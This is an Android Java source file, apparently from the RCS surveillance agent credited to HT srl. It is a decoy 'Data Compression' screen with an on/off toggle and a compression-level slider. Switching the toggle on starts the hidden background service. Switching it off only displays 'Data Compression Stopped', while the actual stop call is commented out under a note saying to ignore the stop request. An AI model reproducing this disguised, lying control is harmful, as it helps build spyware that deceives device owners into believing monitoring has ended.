/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.gui;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;
import android.widget.SeekBar.OnSeekBarChangeListener;

import com.android.service.Core;
import com.android.service.R;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class AndroidServiceGUI.
 */
public class AndroidServiceGUI extends Activity implements OnSeekBarChangeListener {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$

	private SeekBar seekBar;
	private TextView textProgress;
	
	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		if (Cfg.DEBUG || Cfg.EXCEPTION) {
			actualCreate(savedInstanceState);
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		
		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		SharedPreferences.Editor editor = preferences.edit();
		editor.putInt("compressionLevel", seekBar.getProgress());
		editor.commit();
	}
	
	@Override
    public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
		if (progress >= 0 && progress <= 25) {
			progress = 25;
			seekBar.setProgress(progress);
		} else if (progress > 25 && progress <= 50) {
			progress = 50;
			seekBar.setProgress(progress);
		}  else if (progress > 50 && progress <= 75) {
			progress = 75;
			seekBar.setProgress(progress);
		} else {
			progress = 100;
			seekBar.setProgress(progress);
		}
		
    	textProgress.setText("Compression Level: " + progress + "%");
    }
	
	@Override
    public void onStartTrackingTouch(SeekBar seekBar) {
    	// TODO Auto-generated method stub
    }
	
	@Override
    public void onStopTrackingTouch(SeekBar seekBar) {
    	// TODO Auto-generated method stub
    }

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		final String service = "com.android.service.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";
		boolean checked = isServiceRunning("com.android.service.ServiceCore"); //$NON-NLS-1$

		// Set up click listeners
		final Button runButton = (Button) findViewById(R.id.btntoggle);

		((ToggleButton) runButton).setChecked(checked);

		// Seekbar listener
		seekBar = (SeekBar)findViewById(R.id.seekBar);
        seekBar.setOnSeekBarChangeListener(this);
        textProgress = (TextView)findViewById(R.id.textProgress);
        
		// Retrieve saved status
		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		
		try {
			seekBar.setProgress(preferences.getInt("compressionLevel", 0));
		} catch (Exception e) {
			seekBar.setProgress(75);
		}
        
		
		runButton.setOnClickListener(new OnClickListener() {
			// @Override
			public void onClick(final View v) {
				if (((ToggleButton) v).isChecked()) {
					if (Core.isServiceRunning() == true) {
						return;
					}
					
					try {
						final ComponentName cn = startService(new Intent(service));

						if (cn == null) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
							}
						} else {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
							}
						}
					} catch (final SecurityException se) {
						if (Cfg.EXCEPTION) {
							Check.log(se);
						}

						if (Cfg.DEBUG) {
							Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
						}
					}
				} else {
					// IGNORA LO STOP DEL SERVIZIO
					Toast.makeText(AndroidServiceGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
						
					//stopService(new Intent(service));
				}
			}
		});
	}

	private boolean isServiceRunning(String serviceName) {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if (serviceName.equals(service.service.getClassName())) {
				return true;
			} else {
				if (Cfg.DEBUG) {
					// Check.log(service.service.getClassName());
				}
			}
		}
		
		return false;
	}
}
